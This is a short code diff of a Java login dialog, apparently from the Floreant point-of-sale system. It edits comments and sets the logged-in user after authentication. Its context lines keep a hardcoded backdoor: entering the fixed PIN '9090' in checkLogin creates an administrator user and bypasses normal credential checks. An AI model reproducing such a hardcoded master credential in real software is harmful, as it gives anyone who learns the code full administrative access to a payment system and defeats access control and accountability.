@@ -321,7 +321,7 @@ public class PasswordEntryDialog extends OkCancelOptionDialog implements ActionL
 	}*/
 
 	private synchronized boolean checkLogin(String secretKey) {
-		if (secretKey.compareTo("9090")==0) //hatran add super admin
+		if (secretKey.compareTo("9090")==0) //hatran add super admin in check Login
 		{
 			UserType administrator = new UserType();
 			administrator.setName(com.floreantpos.POSConstants.ADMINISTRATOR);
@@ -344,7 +344,7 @@ public class PasswordEntryDialog extends OkCancelOptionDialog implements ActionL
 			statusLabel.setText(Messages.getString("PasswordEntryDialog.30")); //$NON-NLS-1$
 			return false;
 		}
-
+		Application.getInstance().setCurrentUser(user);//hatran set user after login
 		if (LoginView.getInstance().isBackOfficeLogin()) {
 			if (!user.hasPermission(UserPermission.VIEW_BACK_OFFICE)) {
 				statusLabel.setText("user has no permission to access this view");
